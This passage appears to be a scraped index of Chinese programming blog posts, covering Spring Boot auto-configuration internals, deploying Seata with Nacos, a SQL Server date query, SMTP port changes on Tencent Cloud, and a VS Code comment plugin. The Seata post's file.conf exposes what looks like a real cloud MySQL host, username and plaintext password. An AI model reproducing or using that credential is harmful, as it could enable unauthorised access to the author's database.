web 开发的常见场景 默认的包结构 主程序所在包及其下面的所有子包里面的组件都会被默认扫描进来 无需以前的包扫描配置 想要改变扫描路径，@SpringBootApplication (scanBasePackages=“com.atguigu”) 或者 @ComponentScan 指定扫描路径 12345@SpringBootApplication等同于@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(&quot;com.atguigu.boot&quot;) 各种配置拥有默认值 默认配置最终都是映射到某个类上，如：MultipartProperties 配置文件的值最终会绑定每个类上，这个类会在容器中创建对象 按需加载所有自动配置项 非常多的 starter 引入了哪些场景这个场景的自动配置才会开启 SpringBoot 所有的自动配置功能都在 spring-boot-autoconfigure 包里面 … # 2、容器功能 # 2.1、组件添加 # 1、@Configuration 基本使用 Full 模式与 Lite 模式 示例 最佳实战 配置 类组件之间无依赖关系用 Lite 模式加速容器启动过程，减少判断 配置类组件之间有依赖关系，方法会被调用得到之前单实例组件，用 Full 模式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#############################Configuration使用示例######################################################/** * 1、配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的 * 2、配置类本身也是组件 * 3、proxyBeanMethods：代理bean的方法 * Full(proxyBeanMethods = true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】 * Lite(proxyBeanMethods = false)【每个@Bean方法被调用多少次返回的组件都是新创建的】 * 组件依赖必须使用Full模式默认。其他默认是否Lite模式 * * * */@Configuration(proxyBeanMethods = false) //告诉SpringBoot这是一个配置类 == 配置文件public class MyConfig { /** * Full:外部无论对配置类中的这个组件注册方法调用多少次获取的都是之前注册容器中的单实例对象 * @return */ @Bean //给容器中添加组件。以方法名作为组件的id。返回类型就是组件类型。返回的值，就是组件在容器中的实例 public User user01(){ User zhangsan = new User(&quot;zhangsan&quot;, 18); //user组件依赖了Pet组件 zhangsan.setPet(tomcatPet()); return zhangsan; } @Bean(&quot;tom&quot;) public Pet tomcatPet(){ return new Pet(&quot;tomcat&quot;); }}################################@Configuration测试代码如下########################################@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(&quot;com.atguigu.boot&quot;)public class MainApplication { public static void main(String[] args) { //1、返回我们IOC容器 ConfigurableApplicationContext run = SpringApplication.run(MainApplication.class, args); //2、查看容器里面的组件 String[] names = run.getBeanDefinitionNames(); for (String name : names) { System.out.println(name); } //3、从容器中获取组件 Pet tom01 = run.getBean(&quot;tom&quot;, Pet.class); Pet tom02 = run.getBean(&quot;tom&quot;, Pet.class); System.out.println(&quot;组件：&quot;+(tom01 == tom02)); //4、com.atguigu.boot.config.MyConfig$$EnhancerBySpringCGLIB$$51f1e1ca@1654a892 MyConfig bean = run.getBean(MyConfig.class); System.out.println(bean); //如果@Configuration(proxyBeanMethods = true)代理对象调用方法。SpringBoot总会检查这个组件是否在容器中有。 //保持组件单实例 User user = bean.user01(); User user1 = bean.user01(); System.out.println(user == user1); User user01 = run.getBean(&quot;user01&quot;, User.class); Pet tom = run.getBean(&quot;tom&quot;, Pet.class); System.out.println(&quot;用户的宠物：&quot;+(user01.getPet() == tom)); }} # 2、@Bean、@Component、@Controller、@Service、@Repository # 3、@ComponentScan、@Import 1234567891011 * 4、@Import({User.class, DBHelper.class}) * 给容器中自动创建出这两个类型的组件、默认组件的名字就是全类名 * * * */@Import({User.class, DBHelper.class})@Configuration(proxyBeanMethods = false) //告诉SpringBoot这是一个配置类 == 配置文件public class MyConfig {} @Import 高级用法： https://www.bilibili.com/video/BV1gW411W7wy?p=8 # 4、@Conditional 条件装配：满足 Conditional 指定的条件，则进行组件注入 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647=====================测试条件装配==========================@Configuration(proxyBeanMethods = false) //告诉SpringBoot这是一个配置类 == 配置文件//@ConditionalOnBean(name = &quot;tom&quot;)@ConditionalOnMissingBean(name = &quot;tom&quot;)public class MyConfig { /** * Full:外部无论对配置类中的这个组件注册方法调用多少次获取的都是之前注册容器中的单实例对象 * @return */ @Bean //给容器中添加组件。以方法名作为组件的id。返回类型就是组件类型。返回的值，就是组件在容器中的实例 public User user01(){ User zhangsan = new User(&quot;zhangsan&quot;, 18); //user组件依赖了Pet组件 zhangsan.setPet(tomcatPet()); return zhangsan; } @Bean(&quot;tom22&quot;) public Pet tomcatPet(){ return new Pet(&quot;tomcat&quot;); }}public static void main(String[] args) { //1、返回我们IOC容器 ConfigurableApplicationContext run = SpringApplication.run(MainApplication.class, args); //2、查看容器里面的组件 String[] names = run.getBeanDefinitionNames(); for (String name : names) { System.out.println(name); } boolean tom = run.containsBean(&quot;tom&quot;); System.out.println(&quot;容器中Tom组件：&quot;+tom); boolean user01 = run.containsBean(&quot;user01&quot;); System.out.println(&quot;容器中user01组件：&quot;+user01); boolean tom22 = run.containsBean(&quot;tom22&quot;); System.out.println(&quot;容器中tom22组件：&quot;+tom22); } # 2.2、原生配置文件引入 # 1、@ImportResource 123456789101112131415161718192021222324======================beans.xml=========================&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;bean id=&quot;haha&quot; class=&quot;com.atguigu.boot.bean.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;zhangsan&quot;&gt;&lt;/property&gt; &lt;property name=&quot;age&quot; value=&quot;18&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;bean id=&quot;hehe&quot; class=&quot;com.atguigu.boot.bean.Pet&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;tomcat&quot;&gt;&lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt;@ImportResource(&quot;classpath:beans.xml&quot;)public class MyConfig {}======================测试================= boolean haha = run.containsBean(&quot;haha&quot;); boolean hehe = run.containsBean(&quot;hehe&quot;); System.out.println(&quot;haha：&quot;+haha);//true System.out.println(&quot;hehe：&quot;+hehe);//true # 2.3、配置绑定 如何使用 Java 读取到 properties 文件中的内容，并且把它封装到 JavaBean 中，以供随时使用； 12345678910111213public class getProperties { public static void main(String[] args) throws FileNotFoundException, IOException { Properties pps = new Properties(); pps.load(new FileInputStream(&quot;a.properties&quot;)); Enumeration enum1 = pps.propertyNames();//得到配置文件的名字 while(enum1.hasMoreElements()) { String strKey = (String) enum1.nextElement(); String strValue = pps.getProperty(strKey); System.out.println(strKey + &quot;=&quot; + strValue); //封装到JavaBean。 } } } # 1、@ConfigurationProperties 12345678910111213141516171819202122232425262728293031323334/** * 只有在容器中的组件，才会拥有SpringBoot提供的强大功能 */@Component@ConfigurationProperties(prefix = &quot;mycar&quot;)public class Car { private String brand; private Integer price; public String getBrand() { return brand; } public void setBrand(String brand) { this.brand = brand; } public Integer getPrice() { return price; } public void setPrice(Integer price) { this.price = price; } @Override public String toString() { return &quot;Car{&quot; + &quot;brand='&quot; + brand + '\\'' + &quot;, price=&quot; + price + '}'; }} # 2、@EnableConfigurationProperties + @ConfigurationProperties # 3、@Component + @ConfigurationProperties 12345@EnableConfigurationProperties(Car.class)//1、开启Car配置绑定功能//2、把这个Car这个组件自动注册到容器中public class MyConfig {} # 3、自动配置原理入门 # 3.1、引导加载自动配置类 123456789@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) })public @interface SpringBootApplication{}====================== # 1、@SpringBootConfiguration @Configuration。代表当前是一个配置类 # 2、@ComponentScan 指定扫描哪些，Spring 注解； # 3、@EnableAutoConfiguration 123@AutoConfigurationPackage@Import(AutoConfigurationImportSelector.class)public @interface EnableAutoConfiguration {} # 1、@AutoConfigurationPackage 自动配置包？指定了默认的包规则 12345@Import(AutoConfigurationPackages.Registrar.class) //给容器中导入一个组件public @interface AutoConfigurationPackage {}//利用Registrar给容器中导入一系列组件//将指定的一个包下的所有组件导入进来？MainApplication 所在包下。 # 2、@Import(AutoConfigurationImportSelector.class) 12345671、利用getAutoConfigurationEntry(annotationMetadata);给容器中批量导入一些组件2、调用List&lt;String&gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)获取到所有需要导入到容器中的配置类3、利用工厂加载 Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(@Nullable ClassLoader classLoader)；得到所有的组件4、从META-INF/spring.factories位置来加载一个文件。 默认扫描我们当前系统里面所有META-INF/spring.factories位置的文件 spring-boot-autoconfigure-2.3.4.RELEASE.jar包里面也有META-INF/spring.factories # 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131文件里面写死了spring-boot一启动就要给容器中加载的所有配置类spring-boot-autoconfigure-2.3.4.RELEASE.jar/META-INF/spring.factories# Auto Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\\org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\\org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\\org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\\org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\\org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration,\\org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\\org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\\org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ReactiveElasticsearchRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ReactiveElasticsearchRestClientAutoConfiguration,\\org.springframework.boot.autoconfigure.data.jdbc.JdbcRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoReactiveDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoReactiveRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.r2dbc.R2dbcDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.r2dbc.R2dbcRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.r2dbc.R2dbcTransactionManagerAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisReactiveAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\\org.springframework.boot.autoconfigure.elasticsearch.ElasticsearchRestClientAutoConfiguration,\\org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\\org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\\org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\\org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\\org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\\org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration,\\org.springframework.boot.autoconfigure.http.codec.CodecsAutoConfiguration,\\org.springframework.boot.autoconfigure.influx.InfluxDbAutoConfiguration,\\org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\\org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\\org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\\org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\\org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\\org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\\org.springframework.boot.autoconfigure.jsonb.JsonbAutoConfiguration,\\org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\\org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\\org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.MongoReactiveAutoConfiguration,\\org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\\org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\\org.springframework.boot.autoconfigure.quartz.QuartzAutoConfiguration,\\org.springframework.boot.autoconfigure.r2dbc.R2dbcAutoConfiguration,\\org.springframework.boot.autoconfigure.rsocket.RSocketMessagingAutoConfiguration,\\org.springframework.boot.autoconfigure.rsocket.RSocketRequesterAutoConfiguration,\\org.springframework.boot.autoconfigure.rsocket.RSocketServerAutoConfiguration,\\org.springframework.boot.autoconfigure.rsocket.RSocketStrategiesAutoConfiguration,\\org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration,\\org.springframework.boot.autoconfigure.security.servlet.SecurityFilterAutoConfiguration,\\org.springframework.boot.autoconfigure.security.reactive.ReactiveSecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.reactive.ReactiveUserDetailsServiceAutoConfiguration,\\org.springframework.boot.autoconfigure.security.rsocket.RSocketSecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.saml2.Saml2RelyingPartyAutoConfiguration,\\org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\\org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.client.servlet.OAuth2ClientAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.client.reactive.ReactiveOAuth2ClientAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.resource.servlet.OAuth2ResourceServerAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.resource.reactive.ReactiveOAuth2ResourceServerAutoConfiguration,\\org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\\org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration,\\org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration,\\org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\\org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\\org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.HttpHandlerAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.ReactiveWebServerFactoryAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.WebFluxAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.error.ErrorWebFluxAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.function.client.ClientHttpConnectorAutoConfiguration,\\org.springframework.boot.autoconfigure.web.reactive.function.client.WebClientAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration,\\org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.reactive.WebSocketReactiveAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.servlet.WebSocketMessagingAutoConfiguration,\\org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration,\\org.springframework.boot.autoconfigure.webservices.client.WebServiceTemplateAutoConfiguration # 3.2、按需开启自动配置项 12虽然我们127个场景的所有自动配置启动的时候默认全部加载。xxxxAutoConfiguration按照条件装配规则（@Conditional），最终会按需配置。 # 3.3、修改默认配置 12345678910 @Bean @ConditionalOnBean(MultipartResolver.class) //容器中有这个类型组件 @ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME) //容器中没有这个名字 multipartResolver 的组件 public MultipartResolver multipartResolver(MultipartResolver resolver) { //给@Bean标注的方法传入了对象参数，这个参数的值就会从容器中找。 //SpringMVC multipartResolver。防止有些用户配置的文件上传解析器不符合规范 // Detect if the user has created a MultipartResolver but named it incorrectly return resolver; }给容器中加入了文件上传解析器； # # SpringBoot 默认会在底层配好所有的组件。但是如果用户自己配置了以用户的优先 1234@Bean @ConditionalOnMissingBean public CharacterEncodingFilter characterEncodingFilter() { } # 总结： SpringBoot 先加载所有的自动配置类 xxxxxAutoConfiguration 每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxxProperties 里面拿。xxxProperties 和配置文件进行了绑定 生效的配置类就会给容器中装配很多组件 只要容器中有这些组件，相当于这些功能就有了 定制化配置 用户直接自己 @Bean 替换底层的组件 用户去看这个组件是获取的配置文件什么值就去修改。 xxxxxAutoConfiguration —&gt; 组件 —&gt; xxxxProperties 里面拿值 ----&gt; application.properties # 3.4、最佳实践 引入场景依赖 https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter 查看自动配置了哪些（选做） 自己分析，引入场景对应的自动配置一般都生效了 配置文件中 debug=true 开启自动配置报告。Negative（不生效）\\Positive（生效） 是否需要修改 参照文档修改配置项 https://docs.spring.io/spring-boot/docs/current/reference/html/appendix-application-properties.html#common-application-properties 自己分析。xxxxProperties 绑定了配置文件的哪些。 自定义加入或者替换组件 @Bean、@Component。。。 自定义器 XXXXXCustomizer； … # 4、开发小技巧 # 4.1、Lombok 简化 JavaBean 开发 123456789101112131415161718192021222324252627282930313233343536373839404142 &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt;idea中搜索安装lombok插件===============================简化JavaBean开发===================================@NoArgsConstructor//@AllArgsConstructor@Data@ToString@EqualsAndHashCodepublic class User { private String name; private Integer age; private Pet pet; public User(String name,Integer age){ this.name = name; this.age = age; }}================================简化日志开发===================================@Slf4j@RestControllerpublic class HelloController { @RequestMapping(&quot;/hello&quot;) public String handle01(@RequestParam(&quot;name&quot;) String name){ log.info(&quot;请求进来了....&quot;); return &quot;Hello, Spring Boot 2!&quot;+&quot;你好：&quot;+name; }} # 4.2、dev-tools 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt; 项目或者页面修改以后：Ctrl+F9； # 4.3、Spring Initailizr（项目初始化向导） # 0、选择我们需要的开发场景 # 1、自动依赖引入 # 2、自动创建项目结构 # 3、自动编写好主配置类 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/07/27/%E3%80%90SpringBoot%E3%80%91SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E5%8E%9F%E7%90%86/"},{"title":"Linux以及Windows部署Seata服务","text":"1. 确保 linux 有 Nacos 正常启动，并知晓正确的端口 用户名 密码 https://github.com/seata/seata.git 克隆 seata 项目到本地 在 Github 下载对应你项目 SpringCloudAlibaba 建议版本的 Seata，我的版本是 2.5.5，建议 Seata 版本 1.3.0 下载好后进入 seata/conf 配置目录，修改 file.conf 123456789101112131415161718192021222324252627282930313233343536373839404142## transaction log store, only used in seata-serverstore { ## store mode: file、db、redis mode = &quot;db&quot; #如果单机：file 如果是集群：db 并在下方配置你的Mysql数据源 ## file store property file { ## store location dir dir = &quot;sessionStore&quot; # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ## database store property db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = &quot;druid&quot; ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = &quot;mysql&quot; driverClassName = &quot;com.mysql.jdbc.Driver&quot; url = &quot;jdbc:mysql://sh-cynosdbmysql-grp-o5n8fbw2.sql.tencentcdb.com:20345/seata_server&quot; user = &quot;brath&quot; password = &quot;Lgq081538&quot; minConn = 5 maxConn = 30 globalTable = &quot;global_table&quot; branchTable = &quot;branch_table&quot; lockTable = &quot;lock_table&quot; queryLimit = 100 maxWait = 5000 }} 5. 修改 registry.conf 123456789101112131415161718192021222324252627282930313233registry { type = &quot;nacos&quot; //配置nacos nacos { application = &quot;seata-server&quot; serverAddr = &quot;nacosip+端口&quot; //nacosip+端口 group = &quot;SEATA_GROUP&quot; namespace = &quot;命名空间&quot; //如果默认可以不填 cluster = &quot;default&quot; //如果是集群请填写集群名 username = &quot;账号&quot; password = &quot;密码&quot; } file { name = &quot;file.conf&quot; }}config { type = &quot;nacos&quot; nacos { serverAddr = &quot;nacosip+端口&quot; //nacosip+端口 namespace = &quot;命名空间&quot; //如果默认可以不填 group = &quot;SEATA_GROUP&quot; username = &quot;账号&quot; password = &quot;密码&quot; } file { name = &quot;file.conf&quot; }} 6. 在克隆好的项目中找到 script/confing-center 找到 config.txt 文件 修改 1store.mode=db 修改数据源 123store.db.url=localhost:3306/seata_server?useUnicode=true&amp;rewriteBatchedStatements=truestore.db.user=****store.db.password=**** 进入 script\\config-center\\nacos 如果是 windows 系统请确保安装了 GIT 以及 GIT bash 点击 nacos-config.sh 会自动把 config.txt 配置文件，配置到你的 Nacos 客户端中指定命名空间的配置中心供你的 Seata 使用 7. 进入 Seata/bin 1sh seata-server.sh #启动seata服务 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/16/%E3%80%90SpringCloudAlibaba%E3%80%91Seata%E9%83%A8%E7%BD%B2Linux%E6%96%87%E6%A1%A3/"},{"title":"【SqlServer】SqlServer查询今日和昨日数据","text":"# 【SqlServer】SqlServer 查询今日和昨日数据 在 where 后加入以下 sql 语句 今天： 1where DateDiff(dd,时间字段,getdate())=0 昨天： 1where DateDiff(dd,时间字段,getdate())=1 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/03/29/%E3%80%90SqlServer%E3%80%91SqlServer%E6%9F%A5%E8%AF%A2%E4%BB%8A%E6%97%A5%E5%92%8C%E6%98%A8%E6%97%A5%E6%95%B0%E6%8D%AE/"},{"title":"腾讯云服务器liux系统下无法通过springBoot内置mail发送邮件的解决方案","text":"# 腾讯云服务器 liux 系统下无法通过 springBoot 内置 mail 发送邮件的解决方案 原因 原来是腾讯云基于安全考虑，禁用了端口 25。改成 465 或者解封 25 就可以发邮件了。 原始配置 本地可发送 12345678910111213141516171819spring: mail: username: *********** password: *********** host: smtp.163.com port: 25 default-encoding: UTF-8 properties: mail: smtp: timeout: 10000 auth: true starttls: enable: true required: true socketFactory: port: 25 class: javax.net.ssl.SSLSocketFactory fallback: false 修改的配置 测试 部署到服务器上是可以发送的 12345678910111213141516171819spring: mail: username: *********** password: *********** host: smtp.163.com port: 465 default-encoding: UTF-8 properties: mail: smtp: timeout: 10000 auth: true starttls: enable: true required: true socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory fallback: false # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/04/%E3%80%90SpringBoot%E3%80%91%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8liux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87springBoot%E5%86%85%E7%BD%AEmail%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"【VsCode】VsCode中的HTML嵌套注释、多行注释、多级注释，提高生产力","text":"# 【VsCode】VsCode 中的 HTML 嵌套注释、多行注释、多级注释，提高生产力 # HTML 嵌套注释插件：HTML-Comment # 概述 相信我，这是市面上最好用的 HTML 注释插件，因为这是我体验过很多主流插件后才开发出的工具。 很多人在使用 html 的注释嵌套使用时都会发现并不能达到我们想到的效果，正常情况以下注释会报错： 原生的方法是不支持这种嵌套注释的，只能使用变种方法进行多级注释，方便起见做了个注释插件，使用注释插件注释效果如下： # 使用方法（放开注释同下） Ctrl+Shift+/ 目前改插件只支持 vscode，后续会开发 WebStorm 版本 # 修改按键快捷方式 打开 vscode，找到左上角文件 -&gt; 首选项 -&gt; 键盘快捷方式，输入 HTML-Comment，可以查看并修改按键。 # 支持列表 适用于 htm、html、asp、cfm、jsx、md、njk、php、svelte、svg、tsx、twig、vue、xml、xsl 等格式文件中任意 &lt;!-- &lt;tag&gt;&lt;/tag&gt; --&gt; 风格的代码块。 目前该插件只支持 vscode，后续会开发 WebStorm 版本 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 